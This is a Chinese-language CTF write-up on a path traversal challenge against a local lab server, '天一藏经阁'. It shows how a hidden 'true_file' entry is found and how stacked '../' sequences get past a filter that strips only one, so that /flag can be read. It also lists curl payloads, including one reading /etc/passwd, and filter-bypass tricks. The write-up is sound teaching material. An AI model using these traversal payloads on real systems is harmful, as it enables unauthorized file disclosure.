### 一、题目长什么样

- 题目名：**古籍翻阅**
- 考点：**路径穿越（Path Traversal）**，也叫目录穿越 / LFI（本地文件包含的亲戚）
- 环境：本地起了一个网站服务，地址形如 `http://127.0.0.1:56674/`
- 网站名：**「天一藏经阁」**
- 题面文案：出题人把 flag 藏在了诸多藏书之中

打开首页，是一个"古籍阅读站"，列了 **1000 本"书"**，每本书点进去就是一个链接：

```text
/read?book=zi/zhuangzi/manuscript
/read?book=jing/liji/files
/read?book=shi/hanshu/dump
```

- `book=` 后面是 `分类/书名/卷名` 这种**路径样式的值**
- 服务器拿着这个值去"书架目录"里找文件，把文件内容显示出来 = 一页"古籍"

**第一眼判断**：凡是一个参数看起来在"按路径读文件"（book、file、path、page、download、filename……），就要往**路径穿越**这个方向想。

#### 题目给的附件

- `guji_catalog.txt`：1000 行，就是网站"目录"的字典，每行是一个 `分类/书名/卷名`
- 小知识点：CTF 给你一个大文件/字典，往往不是摆设，先拿去和网站内容**对比（diff）**，这是**信息收集**的一环

---

### 二、解题思路

一句话概括整道题：

> 在 1000 本"书"里找出唯一一本**格式不对**的隐藏书 `true_file` → 访问它拿到提示「flag 在根目录」 → 用 **多层 `../../`** 穿越出书架目录 → 读到根目录 `/flag` → 得到 flag。

#### 1.找异类 —— 对目录做 diff

##### （1）先"读"数据，发现大多数条目的规律

1000 行翻下来，几乎每一行都是同一个骨架：

```text
zi/zhuangzi/manuscript    → 分类 / 书名 / 卷名
jing/shangshu/bin         → 分类 / 书名 / 卷名
shi/shiji/archive         → 分类 / 书名 / 卷名
```

这个结构还有一套"固定词表"：

| 位置    | 含义        | 取值范围                         |
| ------- | ----------- | -------------------------------- |
| 第 1 段 | 分类        | 只有 jing / shi / zi（经/史/子） |
| 第 2 段 | 书名        | 都是真实古籍：庄子、史记、尚书…… |
| 第 3 段 | 卷 / 文件名 | 零碎名词                         |

所以"正常条目"是：**恰好 2 个 `/`、恰好 3 段、首段是那 3 个分类词之一**。

> 看到一堆数据，把"正常"的样子总结出来，"异常"才会自己跳出来。顺序永远是：**观察结构 → 定义正常 → 筛异常**。

##### （2）把"不守规律"的行挑出来

既然正常是"含 `/` 的 3 段式"，那异常最可能藏在"连 `/` 都没有"的行里，于是一条命令解决问题：

```bash
grep -v "/" guji_catalog.txt
```

（`-v` 是反向匹配，整条命令翻译过来就是：**把不含斜杠的行全部打出来**。）

输出只有一行：

```text
737:true_file
```

它三条规矩全犯了：没有分类前缀、书名不是古籍、整体也不是 `a/b/c` 结构。所以它在一堆 `xxx/yyy/zzz` 里格外扎眼。

> 关键心法：这条命令不是凭空想出来的，是先看出了规律，命令只是把规律"翻译"成检索条件。你也可以自定义别的筛法，比如 `grep -vE '^(jing|shi|zi)/'`（找首段不是 jing/shi/zi 的行），一样能命中。**"规律"才重要**。

##### （3）但"格式异常"只是嫌疑，不是答案

**格式不一样 ≠ 一定就是线索。** 

因为这份目录里还有 13 条结尾叫 `/flag` 的（比如 `jing/liji/flag`），语义上更扎眼，但访问它们全是 404「此卷散佚」——它们是出题人放的**诱饵**。

所以正确姿势是：

```text
格式异常   =  候选名单（值得怀疑）
+ 服务器上验证通过（book=true_file 真的返回提示）
= 确定它就是入口
```

**嫌疑 + 验证 = 才敢确定。** 只凭格式下结论，很容易被诱饵带偏。

##### （4）其实有"两条路"能通向同一个答案

这道题比较友好，两种思路会汇聚到同一行：

| 透镜                         | 看什么                                       | 结果                                               |
| ---------------------------- | -------------------------------------------- | -------------------------------------------------- |
| 格式透镜（前面说的）         | 哪一行不遵守 `分类/书名/卷名`                | 只剩 `true_file`                                   |
| 行为透镜（writeup 里的做法） | 哪些条目在服务器上**真的返回内容**而不是 404 | 只有 `true_file`（999 本"正常书"其实是凑数的幌子） |

所谓"行为透镜"，就是做 **diff**：把附件里的 1000 条，和"网站上真实能读到内容的书"对比，发现 999 条都读不到、唯独 `true_file` 有反应。

- **格式透镜更快**：不用一个个点网站，先扫一眼锁定嫌疑，再请求它验证；
- 行为透镜更严谨，适合写脚本批量做。

两条路殊途同归，最后都指向同一个入口。

##### （5）名字本身也在"自我暴露"

`true_file` 除了格式可疑，名字也自带信息：**snake_case 的通用英文名，字面意思就是"真正的文件"**。

> 格式可疑 + 名字可疑 + 行为可疑，三点重合。

##### （6）收进口诀，以后复用

```text
找异类的通用公式 =
  先看清大多数是什么样
  → 把违反规律的那几个挑出来
  → 再到真实环境里验证哪个是真的
```

这个习惯不止路径穿越题能用：做 diff、找隐藏接口、逆文件格式、分析流量包，全是同一招。

#### 2.访问隐藏入口，拿提示

既然是隐藏入口，就把它当"书名"传进去：

```bash
curl "http://127.0.0.1:56674/read?book=true_file"
```

或者去网页：

```
http://127.0.0.1:56674/read?book=true_file
```

![image-20260907164214588](/assets/guji-path-traversal/image-20260907164214588.png)

返回：

```text
其实flag藏在了根目录下，去看看根目录吧
```

意思很明确：**flag 不在书架里，在服务器文件系统的根目录 `/` 下**（多半是 `/flag` 这个文件）。

现在目标变成：让这个网站帮我去读 `/flag`。

#### 3.路径穿越，一层一层往上爬

我按不同深度去试，得到下表（这就是"探测"过程，**多试几层往往直接命中**）：

| 我传的 `book` | 服务器实际去找 | 结果 |
|---|---|---|
| `flag` | 书架目录里找 `flag` | ❌ 404「此卷散佚」 |
| `./flag` | 和上面基本一样 | ❌ 404 |
| `/flag` | 绝对路径，被它拼错/拒掉 | ❌ 404 |
| `../flag` | 只往上走一层，没到根目录 | ❌ 404 |
| `../../flag` | 往上走两层，**逃出去了** | ✅ 返回 flag |
| `../../../flag` | 再深也没关系 | ✅ 返回 flag |

![image-20260907164345047](/assets/guji-path-traversal/image-20260907164345047.png)

命中！拿到flag。（自己去试试拿flag，不直接给答案）

### 三、核心知识点：到底什么是路径穿越

#### 1. 先搞懂"路径"和 `..`

- 服务器里的文件是按"路径"摆放的，像 Windows 的文件夹一层套一层：`/app/books/zi/zhuangzi/manuscript`
- `.` = 当前目录
- `..` = **上一级目录**（Windows 资源管理器里那个"向上"按钮就是它）
- 所以在路径里混进 `..`，就等于说"我要往上走一层"

#### 2. 漏洞是怎么产生的

网站要"按用户给的名字去读书"，于是代码大概长这样：

```python
# 伪代码，示意即可
base_dir = "/app/books/"            # 书架目录，理论上只能读这里面的书
user_input = request.args["book"]   # 用户传进来的书名
path = base_dir + user_input        # 直接拼接
print(open(path).read())            # 然后读它
```

问题出在：**它相信了用户的输入，直接把 `book` 拼到路径里**。

如果我传的不是书名，而是：

```text
../../flag
```

拼接出来就变成：

```text
/app/books/../../flag
```

`/app/books/..` 会退回到 `/app`，再 `..` 回到 `/`，于是就读到了根目录的 `/flag`。

> 这就是**路径穿越（Path Traversal）**：本该只能读"书架"里的书，结果能越权读服务器上任意能读到的文件。

#### 3. 那 `../flag` 为什么 404，而 `../../flag` 就行？

服务器不是完全没设防，它做了个**很粗糙的过滤**：只处理/拦截**一次** `../`。

- `../flag`：被它清理/挡掉后，剩下的部分还在书架里 → 找不到 → 404
- `../../flag`：它只清掉**第一个** `../`，**还剩一个 `../` 漏网** → 剩下的那个 `../` 照样往上爬 → 逃出书架 → 读到 `/flag`

简单来说：**黑名单/过滤器只挡一次。**

#### 4. 关键心法

- 防御挡一层 `..`，就试两层、三层、四层……**多试深度**，是打路径穿越题的第一反应
- 甚至可以借一个合法前缀伪装：`jing/liji/../../../../flag`（前面是正经书名，后面疯狂往上爬）
- URL 里 `../` 和 `/` 一般可以直接写，但如果路径里有 `?`、`#`、空格这类特殊字符，要记得做 **URL 编码**（`?` → `%3f` 等）

### 四、解题命令

拿到一份路径穿越题时，可以照这个流程快速试：

```bash
# 1. 先随便访问一下接口，看接口长什么样
curl "http://127.0.0.1:56674/read?book=zi/zhuangzi/manuscript"

# 2. 拿字典找异类（如果题目给了字典）
grep -v "/" guji_catalog.txt

# 3. 访问隐藏入口，读提示
curl "http://127.0.0.1:56674/read?book=true_file"

# 4. 从浅到深试穿越，看哪一层命中
curl "http://127.0.0.1:56674/read?book=../flag"
curl "http://127.0.0.1:56674/read?book=../../flag"
curl "http://127.0.0.1:56674/read?book=../../../flag"

# 5. 想读别的系统文件，同理：多叠几层 ../ 就能出去
curl "http://127.0.0.1:56674/read?book=../../../../etc/passwd"
```

**404 在题目里的说法是「此卷散佚」**（= 这本书丢了 = 文件不存在 = 没读到），说明这条路没通，换一层深度再试。

### 五、这道题主要的两个能力

1. **信息收集 / diff 意识**：题目给的附件不要只当背景资料，拿去跟网站内容对照，找"==对不上的那个=="。Web 题先花 10 分钟看全：首页**源码、请求参数、给的附件、注释、robots.txt**——经常有惊喜。
2. **路径穿越的手感**：能一眼认出"这个参数是拿去读文件的"，并且知道 `..` 能往上爬、过滤挡一层就多叠几层。

#### 提醒：

- 参数叫 `book` / `file` / `filename` / `path` / `download` / `page` / `view` / `template`…… 先试路径穿越
- 后面有 PHP 还会遇到 `php://filter`、`data://`、`file://` 这类**伪协议**，是路径穿越/LFI 的高级玩法

---

### 六、避坑清单

- 探测时用 `curl` 比浏览器方便；浏览器有时会把 `..` 当"上页"处理，或者自动补全编码。
- Windows 的 cmd/PowerShell 打印中文/特殊符号可能乱码，把结果存成文件再看，别误判成"没读到"
- 目录里带 `flag` 字样的条目可能是**诱饵**

---

### 七、一句话总结

> 路径穿越 = 网站拿着用户给的"路径"去读文件，却没拦住 `..`。
> 解法 = 找入口（字典 diff 出 `true_file`）→ 拿提示 → 疯狂叠 `../../` 直到爬到根目录 → 读 `/flag`。
